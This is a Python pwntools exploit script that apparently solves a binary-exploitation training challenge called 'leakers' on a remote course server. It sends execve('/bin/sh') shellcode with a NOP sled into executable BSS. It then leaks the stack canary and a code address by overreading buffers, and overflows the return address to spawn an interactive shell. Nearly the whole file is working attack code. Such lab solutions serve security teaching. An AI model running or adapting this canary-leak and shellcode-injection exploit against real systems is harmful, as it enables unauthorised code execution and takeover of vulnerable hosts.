from pwn import *

#Similar to gonna leak, here I write in BSS (which is made executable by mprotect) the shellcode to spawn a shell with nop sled.
#Then I leak the canary as always with 105 bytes and save it. After I repeat the same procedure in order to get
#an address on the stack of the text section. I do some calculation to increase it until reaching bss where the
#nop sled begins.

context.arch = 'amd64'

shellcode1 =  b"\x90"*66 + b"\x48\x8D\x3D\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x48\x83\xC7\x13\x0F\x05/bin/sh\x00"

#p = process("./leakers")
p = remote("bin.training.offdef.it", 2012)


p.send(shellcode1)

shellcode2 = b"\x41"*105
p.send(shellcode2)

p.recvuntil(b"> ")
time.sleep(0.1)  #to have two different read
p.read(105)
time.sleep(0.1)  #to have two different read
canary = b"\x00" + p.read(7)
canary = u64(canary)

shellcode2 = b"\x42"*136
p.send(shellcode2)
p.recvuntil(b"> ")
time.sleep(0.1)  #to have two different read
p.read(136)
time.sleep(0.1)  #to have two different read
stack_address = p.read(6) + b"\x00" + b"\x00"
stack_address = u64(stack_address)
stack_address = stack_address + 2098976

payload = b"\x90"*104 + p64(canary) + b"\x90"*8 + p64(stack_address) + b"\x90"*72  #34 in second part
p.send(payload)

p.sendline("")
p.interactive()
